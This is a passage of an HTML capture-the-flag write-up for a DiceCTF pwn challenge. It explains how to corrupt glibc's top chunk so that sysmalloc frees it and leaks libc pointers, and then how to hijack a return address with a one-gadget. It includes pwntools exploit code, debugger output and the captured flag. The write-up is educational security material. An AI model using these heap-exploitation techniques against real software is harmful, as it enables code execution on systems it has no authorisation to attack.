+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;program base = </span><span>{</span><span style="color:#f28779;">hex</span><span>(e</span><span style="color:#f29e74;">.</span><span>address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;offset to a heap page = </span><span>{</span><span style="color:#f28779;">hex</span><span>(heap_page)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    maybe_tcache_perthread </span><span style="color:#f29e74;">= </span><span>heap_page </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x20
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;1 </span><span>{maybe_tcache_perthread}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;L&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">if </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span>(</span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#f29e74;">== </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x91</span><span style="color:#bae67e;">&#39;</span><span>:
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>        maybe_tcache_perthread </span><span style="color:#f29e74;">-= </span><span style="color:#ffcc66;">0x1000
+</span><span>    heap_base </span><span style="color:#f29e74;">= </span><span>maybe_tcache_perthread </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x8
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;offset to heap base = </span><span>{</span><span style="color:#f28779;">hex</span><span>(heap_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<h2 id="manifesting-a-libc-pointer-in-the-heap">manifesting a libc pointer in the heap</h2>
+<p>So, what now?</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>gef&gt; scan heap libc
+</span><span>[+] Searching for addresses in &#39;heap&#39; that point to &#39;libc&#39;
+</span><span>gef&gt; 
+</span></code></pre>
+<p>well that sucks lmao</p>
+<p>Usually it's fairly straightforward to get pointers into libc in the heap.  Free a chunk into unsorted bins and either side of the free list will be pointing at main_arena in libc.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1926
+</span><span style="color:#ffa759;">static struct</span><span> malloc_state main_arena </span><span style="color:#f29e74;">=
+</span><span>{
+</span><span>  </span><span style="color:#f29e74;">.</span><span>mutex </span><span style="color:#f29e74;">=</span><span> _LIBC_LOCK_INITIALIZER</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#f29e74;">.</span><span>next </span><span style="color:#f29e74;">= &amp;</span><span>main_arena</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#f29e74;">.</span><span>attached_threads </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1
+</span><span>}</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1541
+</span><span style="color:#ffa759;">#define </span><span style="color:#ffd580;">bin_at</span><span>(</span><span style="color:#ffcc66;">m</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">i</span><span>) </span><span style="color:#ccc9c2cc;">\
+</span><span>  (mbinptr) (((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>) </span><span style="color:#f29e74;">&amp;</span><span>((m)</span><span style="color:#f29e74;">-&gt;</span><span>bins[((i) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">2</span><span>]))			      \
+</span><span>             </span><span style="color:#f29e74;">- </span><span style="color:#ffd580;">offsetof </span><span>(</span><span style="color:#ffa759;">struct</span><span> malloc_chunk</span><span style="color:#ccc9c2cc;">,</span><span> fd))
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1680
+</span><span style="color:#ffa759;">#define </span><span style="color:#ffd580;">unsorted_chunks</span><span>(</span><span style="color:#ffcc66;">M</span><span>)          (</span><span style="color:#ffd580;">bin_at </span><span>(M</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4627
+</span><span>bck </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">unsorted_chunks</span><span>(av)</span><span style="color:#ccc9c2cc;">;
+</span><span>fwd </span><span style="color:#f29e74;">=</span><span> bck</span><span style="color:#f29e74;">-&gt;</span><span>fd</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffd580;">__glibc_unlikely </span><span>(fwd</span><span style="color:#f29e74;">-&gt;</span><span>bk </span><span style="color:#f29e74;">!=</span><span> bck))
+</span><span>	</span><span style="color:#ffd580;">malloc_printerr </span><span>(</span><span style="color:#bae67e;">&quot;free(): corrupted unsorted chunks&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>p</span><span style="color:#f29e74;">-&gt;</span><span>fd </span><span style="color:#f29e74;">=</span><span> fwd</span><span style="color:#ccc9c2cc;">;
+</span><span>p</span><span style="color:#f29e74;">-&gt;</span><span>bk </span><span style="color:#f29e74;">=</span><span> bck</span><span style="color:#ccc9c2cc;">;
+</span></code></pre>
+<p>Unfortunately, in this case we don't have much ability to work with the heap in this binary.  There is (as far as I'm aware) a single relevant primitive -- scanf <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfscanf-internal.c#L336">allocates a scratch buffer</a> and then frees it at the end.  However, the lifetime of this chunk (allocated, used, freed) usually just means it gets consolidated against the predecessor chunk (top chunk in this case).</p>
+<p>So, then, how can we prevent this consolidation?  We don't have enough control over the ordering of the heap chunks to prevent it from consolidating naturally -- but we do have a very strong write primitive.  Can the heap be corrupted in such a way so as to prevent consolidation? Keeping in mind that we have no control between the allocation and corresponding free?</p>
+<p>There isn't really much on the heap to work with but the first place to look is the top chunk -- where our allocated chunk is split off from and then consolidated against.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4353
+</span><span>use_top</span><span style="color:#f29e74;">:
+</span><span>  </span><span style="font-style:italic;color:#5c6773;">/*
+</span><span style="font-style:italic;color:#5c6773;">	 If large enough, split off the chunk bordering the end of memory
+</span><span style="font-style:italic;color:#5c6773;">	 (held in av-&gt;top). Note that this is in accord with the best-fit
+</span><span style="font-style:italic;color:#5c6773;">	 search rule.  In effect, av-&gt;top is treated as larger (and thus
+</span><span style="font-style:italic;color:#5c6773;">	 less well fitting) than any other available chunk since it can
+</span><span style="font-style:italic;color:#5c6773;">	 be extended to be as large as necessary (up to system
+</span><span style="font-style:italic;color:#5c6773;">	 limitations).
+</span><span style="font-style:italic;color:#5c6773;">
+</span><span style="font-style:italic;color:#5c6773;">	 We require that av-&gt;top always exists (i.e., has size &gt;=
+</span><span style="font-style:italic;color:#5c6773;">	 MINSIZE) after initialization, so if it would otherwise be
+</span><span style="font-style:italic;color:#5c6773;">	 exhausted by current request, it is replenished. (The main
+</span><span style="font-style:italic;color:#5c6773;">	 reason for ensuring it exists is that we may need MINSIZE space
+</span><span style="font-style:italic;color:#5c6773;">	 to put in fenceposts in sysmalloc.)
+</span><span style="font-style:italic;color:#5c6773;">   */
+</span><span>
+</span><span>  victim </span><span style="color:#f29e74;">=</span><span> av</span><span style="color:#f29e74;">-&gt;</span><span>top</span><span style="color:#ccc9c2cc;">;
+</span><span>  size </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">chunksize </span><span>(victim)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffd580;">__glibc_unlikely </span><span>(size </span><span style="color:#f29e74;">&gt;</span><span> av</span><span style="color:#f29e74;">-&gt;</span><span>system_mem))
+</span><span>	</span><span style="color:#ffd580;">malloc_printerr </span><span>(</span><span style="color:#bae67e;">&quot;malloc(): corrupted top size&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>  </span><span style="color:#ffa759;">if </span><span>((</span><span style="color:#ffa759;">unsigned long</span><span>) (size) </span><span style="color:#f29e74;">&gt;= </span><span>(</span><span style="color:#ffa759;">unsigned long</span><span>) (nb </span><span style="color:#f29e74;">+</span><span> MINSIZE))
+</span><span>	{
+</span><span>	  remainder_size </span><span style="color:#f29e74;">=</span><span> size </span><span style="color:#f29e74;">-</span><span> nb</span><span style="color:#ccc9c2cc;">;
+</span><span>	  remainder </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">chunk_at_offset </span><span>(victim</span><span style="color:#ccc9c2cc;">,</span><span> nb)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  av</span><span style="color:#f29e74;">-&gt;</span><span>top </span><span style="color:#f29e74;">=</span><span> remainder</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffd580;">set_head </span><span>(victim</span><span style="color:#ccc9c2cc;">,</span><span> nb </span><span style="color:#f29e74;">|</span><span> PREV_INUSE </span><span style="color:#f29e74;">|
+</span><span>				(av </span><span style="color:#f29e74;">!= &amp;</span><span>main_arena </span><span style="color:#f29e74;">?</span><span> NON_MAIN_ARENA </span><span style="color:#f29e74;">: </span><span style="color:#ffcc66;">0</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffd580;">set_head </span><span>(remainder</span><span style="color:#ccc9c2cc;">,</span><span> remainder_size </span><span style="color:#f29e74;">|</span><span> PREV_INUSE)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	  </span><span style="color:#ffd580;">check_malloced_chunk </span><span>(av</span><span style="color:#ccc9c2cc;">,</span><span> victim</span><span style="color:#ccc9c2cc;">,</span><span> nb)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffa759;">void </span><span style="color:#f29e74;">*</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">chunk2mem </span><span>(victim)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffd580;">alloc_perturb </span><span>(p</span><span style="color:#ccc9c2cc;">,</span><span> bytes)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffa759;">return</span><span> p</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>
+</span><span>  </span><span style="font-style:italic;color:#5c6773;">/* When we are using atomic ops to free fast chunks we can get
+</span><span style="font-style:italic;color:#5c6773;">	 here for all block sizes.  */
+</span><span>  </span><span style="color:#ffa759;">else if </span><span>(</span><span style="color:#ffd580;">atomic_load_relaxed </span><span>(</span><span style="color:#f29e74;">&amp;</span><span>av</span><span style="color:#f29e74;">-&gt;</span><span>have_fastchunks))
+</span><span>	{
+</span><span>	  </span><span style="color:#ffd580;">malloc_consolidate </span><span>(av)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="font-style:italic;color:#5c6773;">/* restore original bin index */
+</span><span>	  </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffd580;">in_smallbin_range </span><span>(nb))
+</span><span>		idx </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">smallbin_index </span><span>(nb)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffa759;">else
+</span><span>		idx </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">largebin_index </span><span>(nb)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>
+</span><span>  </span><span style="font-style:italic;color:#5c6773;">/*
+</span><span style="font-style:italic;color:#5c6773;">	 Otherwise, relay to handle system-dependent cases
+</span><span style="font-style:italic;color:#5c6773;">   */
+</span><span>  </span><span style="color:#ffa759;">else
+</span><span>	{
+</span><span>	  </span><span style="color:#ffa759;">void </span><span style="color:#f29e74;">*</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">sysmalloc </span><span>(nb</span><span style="color:#ccc9c2cc;">,</span><span> av)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffa759;">if </span><span>(p </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">NULL</span><span>)
+</span><span>		</span><span style="color:#ffd580;">alloc_perturb </span><span>(p</span><span style="color:#ccc9c2cc;">,</span><span> bytes)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffa759;">return</span><span> p</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span></code></pre>
+<p>There are two cases when allocating a chunk without pulling from the bins.  If the top chunk has sufficient size then a chunk is split off from the top chunk.  Otherwise, it will call into sysmalloc to handle "system-dependent cases".</p>
+<p>Sysmalloc has a lot of weird alternate cases!  Allocations of sufficient size (sufficient size being a sliding scale, starts at 128k bytes and caps at 4mb on amd64 libc 2.35) are fulfilled with mmap.  If needed, it will attempt to use sbrk to extend the length of the heap.  The key to our problem lies in how malloc handles an edge case involving the heap extension -- new heap pages which are not not contiguous with the old heap (either because the address space is noncontiguous or because non-libc code called sbrk).  In such a case malloc will skip over that segment, create a new top chunk, and then <em>prevent consolidation and free the old top chunk</em>.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span> </span><span style="font-style:italic;color:#5c6773;">/*
+</span><span style="font-style:italic;color:#5c6773;">	 If not the first time through, we either have a
+</span><span style="font-style:italic;color:#5c6773;">	 gap due to foreign sbrk or a non-contiguous region.  Insert a
+</span><span style="font-style:italic;color:#5c6773;">	 double fencepost at old_top to prevent consolidation with space
+</span><span style="font-style:italic;color:#5c6773;">	 we don&#39;t own. These fenceposts are artificial chunks that are
+</span><span style="font-style:italic;color:#5c6773;">	 marked as inuse and are in any case too small to use.  We need
+</span><span style="font-style:italic;color:#5c6773;">	 two to make sizes and alignments work out.
+</span><span style="font-style:italic;color:#5c6773;">   */
+</span><span>
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(old_size </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>)
+</span><span>	{
+</span><span>	  </span><span style="font-style:italic;color:#5c6773;">/*
+</span><span style="font-style:italic;color:#5c6773;">		 Shrink old_top to insert fenceposts, keeping size a
+</span><span style="font-style:italic;color:#5c6773;">		 multiple of MALLOC_ALIGNMENT. We know there is at least
+</span><span style="font-style:italic;color:#5c6773;">		 enough space in old_top to do this.
+</span><span style="font-style:italic;color:#5c6773;">	   */
+</span><span>	  old_size </span><span style="color:#f29e74;">= </span><span>(old_size </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">*</span><span> CHUNK_HDR_SZ) </span><span style="color:#f29e74;">&amp; ~</span><span>MALLOC_ALIGN_MASK</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffd580;">set_head </span><span>(old_top</span><span style="color:#ccc9c2cc;">,</span><span> old_size </span><span style="color:#f29e74;">|</span><span> PREV_INUSE)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	  </span><span style="font-style:italic;color:#5c6773;">/*
+</span><span style="font-style:italic;color:#5c6773;">		 Note that the following assignments completely overwrite
+</span><span style="font-style:italic;color:#5c6773;">		 old_top when old_size was previously MINSIZE.  This is
+</span><span style="font-style:italic;color:#5c6773;">		 intentional. We need the fencepost, even if old_top otherwise gets
+</span><span style="font-style:italic;color:#5c6773;">		 lost.
+</span><span style="font-style:italic;color:#5c6773;">	   */
+</span><span style="color:#ffd580;">set_head </span><span>(</span><span style="color:#ffd580;">chunk_at_offset </span><span>(old_top</span><span style="color:#ccc9c2cc;">,</span><span> old_size)</span><span style="color:#ccc9c2cc;">,
+</span><span>CHUNK_HDR_SZ </span><span style="color:#f29e74;">|</span><span> PREV_INUSE)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffd580;">set_head </span><span>(</span><span style="color:#ffd580;">chunk_at_offset </span><span>(old_top</span><span style="color:#ccc9c2cc;">,
+</span><span>		 old_size </span><span style="color:#f29e74;">+</span><span> CHUNK_HDR_SZ)</span><span style="color:#ccc9c2cc;">,
+</span><span>CHUNK_HDR_SZ </span><span style="color:#f29e74;">|</span><span> PREV_INUSE)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	  </span><span style="font-style:italic;color:#5c6773;">/* If possible, release the rest. */
+</span><span>	  </span><span style="color:#ffa759;">if </span><span>(old_size </span><span style="color:#f29e74;">&gt;=</span><span> MINSIZE)
+</span><span>		{
+</span><span>		  </span><span style="color:#ffd580;">_int_free </span><span>(av</span><span style="color:#ccc9c2cc;">,</span><span> old_top</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span></code></pre>
+<p>This is very promising, but we don't have the ability to actually call force sbrk to return a noncontiguous page right?  The answer is no -- but it's actually unnecessary! Contiguity is checked naively -- the old heap end is computed based off the top chunk + top chunk size.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2606
+</span><span>old_top </span><span style="color:#f29e74;">=</span><span> av</span><span style="color:#f29e74;">-&gt;</span><span>top</span><span style="color:#ccc9c2cc;">;
+</span><span>old_size </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">chunksize </span><span>(old_top)</span><span style="color:#ccc9c2cc;">;
+</span><span>old_end </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>) (</span><span style="color:#ffd580;">chunk_at_offset </span><span>(old_top</span><span style="color:#ccc9c2cc;">,</span><span> old_size))</span><span style="color:#ccc9c2cc;">;
+</span><span style="font-style:italic;color:#5c6773;">// ...
+</span><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547
+</span><span style="color:#ffa759;">if </span><span>(brk </span><span style="color:#f29e74;">==</span><span> old_end </span><span style="color:#f29e74;">&amp;&amp;</span><span> snd_brk </span><span style="color:#f29e74;">== </span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>) (MORECORE_FAILURE)) {
+</span><span style="font-style:italic;color:#5c6773;">// ...
+</span><span>} </span><span style="color:#ffa759;">else </span><span>{
+</span><span style="font-style:italic;color:#5c6773;">// handles noncontiguous sbrk
+</span><span>}
+</span></code></pre>
+<p>We don't need to force sbrk to return a noncontiguous page -- just convince malloc that it did do so.  By using our byte swap primitive to shrink the size of the top chunk (from 0x20550 to 0x550) and then making an allocation larger than the new top chunk size (which extends the heap) we end up with the old top chunk in an unsorted bin with two pointers to libc present.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>top_chunk </span><span style="color:#f29e74;">= </span><span>heap_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x0ab8
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;-3 </span><span>{top_chunk</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span>}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-1 -&quot;</span><span style="color:#f29e74;">+</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;</span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">0x800</span><span>)
+</span></code></pre>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>gef&gt; heap bins
+</span><span>Unsorted Bin for arena &#39;main_arena&#39; 
+</span><span>-----------------------------------------------------------
+</span><span>unsorted_bin[idx=0, size=any, @0x7ffff7faacf0]: fd=0x555555564ab0, bk=0x555555564ab0
+</span><span> -&gt; Chunk(addr=0x555555564ab0, size=0x530, flags=PREV_INUSE, fd=0x7ffff7faace0, bk=0x7ffff7faace0)
+</span><span>[+] Found 1 valid chunks in unsorted bin.
+</span></code></pre>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>gef&gt; scan heap libc
+</span><span>[+] Searching for addresses in &#39;heap&#39; that point to &#39;libc&#39;
+</span><span>[heap]: 0x0000555555564ac0  -&gt;  0x00007ffff7faace0  -&gt;  0x0000555555585000  -&gt;  0x0000000000000000
+</span><span>[heap]: 0x0000555555564ac8  -&gt;  0x00007ffff7faace0  -&gt;  0x0000555555585000  -&gt;  0x0000000000000000
+</span><span>gef&gt; 
+</span></code></pre>
+<h2 id="win">win</h2>
+<p>With arbitrary write (ish -- its a swap but we could put arb bytes in the stdin buffer if needed) it's basically over.  I chose to replace a saved return address (and rbp, as rbp-0x78 needed to be writable) with a one gadget.</p>
+<p>gg fun challenge :)</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>❯ python3 solve.py
+</span><span>[+] Bruting: Done
+</span><span>[*] __dso_handle = 0x55d54865f008
+</span><span>[*] program base = 0x55d548650000
+</span><span>[*] offset to a heap page = 0x1995000
+</span><span>[*] offset to heap base = 0x1986fe0
+</span><span>[*] libc.address = 0x7f89e407e000
+</span><span>[*] stack address (main saved ret) = 0x7ffc792a8688
+</span><span>[*] one_gadget = 0x7f89e4169c88
+</span><span>[+] Receiving all data: Done (9B)
+</span><span>[*] Closed connection to localhost port 5000
+</span><span>b&#39; dice{i7_S33MS_sOm3BODY_cOOK3D_h3r3_8ff4c343}\r\n&#39;
+</span></code></pre>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>e </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;boogie-woogie&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;zellij&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;action&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;new-pane&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;right&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-c&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;--&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;zsh&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-c&quot;</span><span>]
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>e
+</span><span>
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>context</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">quietfunc
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>([e</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([e</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;localhost&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5000</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">brute_heap_offset</span><span>():
+</span><span>        idx </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">with </span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">progress</span><span>(</span><span style="color:#bae67e;">&#39;Bruting&#39;</span><span>) </span><span style="color:#ffa759;">as </span><span>p:
+</span><span>            </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>                </span><span style="color:#ffa759;">try</span><span>:
+</span><span>                    idx </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>                    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">status</span><span>(</span><span style="color:#bae67e;">&quot;attempt </span><span style="color:#ffcc66;">%i</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span>idx)
+</span><span>                    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception&quot;</span><span>)
+</span><span>                    trial_heap_offset </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x1995fe0
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;"># trial_heap_offset = 0x1000 # lol testing without aslr
+</span><span>                    
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;1 </span><span>{trial_heap_offset}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>                    
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception&quot;</span><span>)
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;1 </span><span>{trial_heap_offset}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>                    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">success</span><span>()
+</span><span>                    </span><span style="color:#ffa759;">return </span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>trial_heap_offset </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">12 </span><span style="color:#f29e74;">&lt;&lt; </span><span style="color:#ffcc66;">12</span><span>)
